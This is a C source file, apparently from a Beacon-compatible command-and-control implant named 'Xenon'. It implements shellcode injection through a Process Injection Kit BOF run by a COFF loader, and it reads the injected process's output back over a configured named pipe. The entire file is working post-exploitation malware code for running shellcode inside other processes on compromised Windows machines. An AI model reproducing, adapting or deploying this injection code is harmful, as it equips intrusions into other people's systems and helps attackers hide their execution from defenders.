#include "Inject.h"

#include "Xenon.h"
#include "Config.h"
#include "Package.h"
#include "BeaconCompatibility.h"
#include "Identity.h"

/* This file requires the COFF loader for Process Injection Kit capabilities */
#if defined(INCLUDE_CMD_INJECT_SHELLCODE) || defined(INCLUDE_CMD_INLINE_EXECUTE)

/**
 * @brief Inject PIC using Process Injection Kit (BOF) and return output
 * @return BOOL
 */
BOOL InjectShellcodeViaKit(
	_In_  PBYTE   buffer, 
	_In_  SIZE_T  bufferLen, 
	_In_  PCHAR   InjectKit, 
	_In_  SIZE_T  kitLen, 
	_Out_ PCHAR*  outData, 
	_Out_ SIZE_T* outLen
)
{
	BOOL   Status  = FALSE;
	HANDLE hPipe   = NULL;
	PCHAR  output  = NULL;
	PCHAR BofOutBuf = NULL;
	DWORD  Length  = 0;
	DWORD  Wait	   = 0;
	OVERLAPPED ov  = { 0 };

    ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

	Status = InitNamedPipe(&ov, &hPipe);
	if ( Status == FALSE || hPipe == NULL ) 
	{
		_err("Failed to initialize named pipe. ERROR : %d", GetLastError())
		return Status;
	}

	/* Pack arguments for Inject Kit (ignoreToken / buffer) */
	BOOL ignoreToken = FALSE;
    PPackage temp = PackageInit(NULL, FALSE);
    PackageAddShort(temp, (USHORT)ignoreToken);                         // +2 bytes
    PackageAddInt32(temp, bufferLen);                           		// +4 bytes little-endian
    PackageAddBytes(temp, buffer, bufferLen, FALSE);					// +sizeof(shellcode) bytes
    PPackage arguments = PackageInit(NULL, FALSE);                      // Length-prefix the whole package
    PackageAddBytes(arguments, temp->buffer, temp->length, TRUE);

	PackageDestroy(temp);

    /* Inject PIC with Custom Process Injection Kit BOF */
    DWORD filesize = kitLen;
    if ( !RunCOFF(InjectKit, &filesize, "gox64", arguments->buffer, arguments->length) )
	{
		_err("Failed to execute BOF in current thread.");
		goto END;
	}


	Wait = WaitForSingleObject(ov.hEvent, 10000); 		// 10s
	if ( Wait != WAIT_OBJECT_0 )
	{
		_err("[-] Timeout or wait failed: %d\n", GetLastError());
		goto END;
	}
 
	/* Read any stdin/stderr from injected process */
	if ( !ReadNamedPipe(hPipe, &output, &Length) )
	{
		_err("[-] No output or read failed\n");
		goto END;
	}


	_dbg("[+] Received %lu bytes of output", Length);
	_dbg("%.*s\n", Length, output);  // if it's printable


	/* Read any output from the Process Inject BOF */
	int BofOutLen = 0;
    BofOutBuf = BeaconGetOutputData(&BofOutLen);
	if (BofOutBuf == NULL) {
        _err("[!] Failed get BOF output");
        goto END;
	}

	/* Combine BOF output and named pipe output */
	DWORD totalLen = BofOutLen + Length;
	PCHAR finalOutput = (PCHAR)malloc(totalLen + 1);
	if (finalOutput == NULL) {
		_err("[-] Failed to allocate memory for final output");
		goto END;
	}

	memcpy(finalOutput, BofOutBuf, BofOutLen);
	memcpy(finalOutput + BofOutLen, output, Length);
	finalOutput[totalLen] = '\0';

	*outData = finalOutput;
	*outLen  = totalLen;

	Status = TRUE;

END:
	// Cleanup
	if (BofOutBuf) free(BofOutBuf);
	PackageDestroy(arguments);
    if (hPipe) CloseHandle(hPipe);
    if (ov.hEvent) CloseHandle(ov.hEvent);

	return Status;
}


/**
 * @brief Initialize an asynchronous named pipe to get output from injection
 * 
 * @param[out] pOutHandle pointer to handle of named pipe 
 * @param[inout] ov OVERLAPPED structure for pipe
 * @return BOOL
 */
BOOL InitNamedPipe(_Inout_ OVERLAPPED* ov, _Out_ HANDLE* pOutHandle)
{
	/* Setup Named Pipe in OVERLAPPED mode */
    char fullPipePath[256];
    snprintf(fullPipePath, sizeof(fullPipePath), "\\\\.\\pipe\\%s", xenonConfig->pipename);

    HANDLE hPipe = CreateNamedPipeA(
        fullPipePath,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1,              // max instances
        4096, 4096,     // output/input buffer size
        0,              // default timeout
        NULL            // security attributes
    );

    if ( hPipe == INVALID_HANDLE_VALUE ) 
	{
        _err("[-] Failed to create named pipe: %lu\n", GetLastError());
        return FALSE;
    }

    _dbg("[*] Waiting for connection back to the pipe...\n");
    if ( !ConnectNamedPipe(hPipe, ov) )
	{
        DWORD err = GetLastError();
        if ( err != ERROR_IO_PENDING && err != ERROR_PIPE_CONNECTED )
		{
            _err("[-] ConnectNamedPipe failed: %lu\n", err);
            CloseHandle(hPipe);
        }
    }

	*pOutHandle = hPipe;

	return TRUE;
}

/**
 * @brief Read All Output from Named Pipe
 * @return BOOL
 */
BOOL ReadNamedPipe(_In_ HANDLE hPipe, _Out_ PCHAR* outBuffer, _Out_ DWORD* outSize)
{
    DWORD bytesRead = 0;
    DWORD totalRead = 0;
    DWORD chunkSize = 4096;
    char* buffer = NULL;
    char temp[4096];

    *outBuffer = NULL;
    *outSize = 0;

    while (TRUE) {
        BOOL ok = ReadFile(hPipe, temp, sizeof(temp), &bytesRead, NULL);
        if ( !ok || bytesRead == 0 )
		{
            DWORD error = GetLastError();
            if ( error == ERROR_BROKEN_PIPE || error == ERROR_NO_DATA || bytesRead == 0 )
			{
				break;  // No more data
            } 
			else 
			{
                _err("[-] ReadFile failed: %lu\n", error);
                free(buffer);
                return FALSE;
            }
        }

        // Expand buffer and copy data
        char* newBuffer = (char*)realloc(buffer, totalRead + bytesRead);
        if (!newBuffer) {
            _err("[-] realloc failed\n");
            free(buffer);
            return FALSE;
        }

        buffer = newBuffer;
        memcpy(buffer + totalRead, temp, bytesRead);
        totalRead += bytesRead;
    }

	*outBuffer = buffer;
    *outSize = totalRead;

    return TRUE;
}

#endif //INCLUDE_CMD_INJECT_SHELLCODE && INCLUDE_CMD_INLINE_EXECUTE
